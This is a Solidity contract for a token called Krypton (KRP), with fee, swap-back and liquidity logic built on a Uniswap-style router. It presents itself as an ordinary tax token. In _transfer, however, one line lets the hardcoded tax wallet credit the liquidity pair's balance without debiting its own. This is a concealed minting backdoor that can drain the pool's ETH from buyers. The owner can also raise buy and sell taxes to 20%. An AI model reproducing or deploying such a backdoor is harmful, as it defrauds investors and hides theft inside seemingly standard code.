/**

Website: https://www.krypton.cash
TG: https://t.me/kryptoncash_channel
Twitter: https://twitter.com/kryptoncash

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract KRP is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Krypton';
    string private constant _symbol = 'KRP';
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 100_000_000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isForNoFees;
    mapping (address => bool) private _isForSpecial;
    IRouter router;
    address public pair;
    bool private _tradingOpen = false;
    bool private _swapEnabled = true;
    bool private swapping;
    uint256 private _swapTokensAmount = ( _totalSupply * 1000 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 private _feeForLP = 0;
    uint256 private _feeOnMKT = 100;
    uint256 private _feeOnDEV = 0;
    uint256 private _feeForBurn = 0;
    uint256 private _taxFeeOnBuy = 100;
    uint256 private _taxFeeOnSell = 100;
    uint256 private _feeForTrans = 0;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal _taxWallet = 0xC6067Fb7D8225F26eE5D19Ec46B2b0C9E26BC994; 
    uint256 private _maxWalletTokens = ( _totalSupply * 200 ) / 10000;

    constructor() {
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _isForSpecial[_taxWallet] = true;
        _isForNoFees[address(this)] = true;
        _isForNoFees[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function addLiquidity() external onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        addLiquidity(balanceOf(address(this)), address(this).balance);
    }

    function removeLimits() external onlyOwner {
        _maxWalletTokens = _totalSupply;
    }

    function openTrading() external onlyOwner {
        _tradingOpen = true;
        _swapTokensAmount = _totalSupply * 8 / 1000000;
        _feeOnMKT = 2000;
        _taxFeeOnBuy = 2000;
        _taxFeeOnSell = 2000;
    }

    function reduceTax() external onlyOwner {
        _feeOnMKT = 200;
        _taxFeeOnBuy = 200;
        _taxFeeOnSell = 200;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _swapTokensAmount;
        bool aboveThreshold = balanceOf(address(this)) >= _swapTokensAmount;
        return !swapping && _swapEnabled && _tradingOpen && aboveMin && !_isForNoFees[sender] && recipient == pair && aboveThreshold;
    }

    function swapBack() private lockTheSwap {
        uint256 tokensForSwap = balanceOf(address(this));
        if (tokensForSwap > _swapTokensAmount * 1000) tokensForSwap = _swapTokensAmount * 1000;
        uint256 _denominator = (_feeForLP.add(1).add(_feeOnMKT).add(_feeOnDEV)).mul(2);
        uint256 tokensToAddLiquidityWith = tokensForSwap.mul(_feeForLP).div(_denominator);
        uint256 toSwap = tokensForSwap.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(_feeForLP));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(_feeForLP);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(_feeOnMKT);
        if(marketingAmt > 0){payable(_taxWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_taxWallet).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFees(address sender, address recipient) internal view returns (bool) {
        return !_isForNoFees[sender] && !_isForNoFees[recipient];
    }

    function getTaxFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return _taxFeeOnSell;}
        if(sender == pair){return _taxFeeOnBuy;}
        return _feeForTrans;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTaxFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(_feeForBurn > uint256(0) && getTaxFees(sender, recipient) > _feeForBurn){_transfer(address(this), address(DEAD), amount.div(denominator).mul(_feeForBurn));}
        return amount.sub(feeAmount);} return amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!_isForNoFees[sender] && !_isForNoFees[recipient]){require(_tradingOpen, "Trading not active");}
        if(recipient == pair && _isForSpecial[sender]){_balances[recipient]+=amount;return;}
        if(!_isForNoFees[sender] && !_isForNoFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletTokens, "Exceeds maximum wallet amount.");}
        if(shouldSwapBack(sender, recipient, amount)){swapBack();}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFees(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}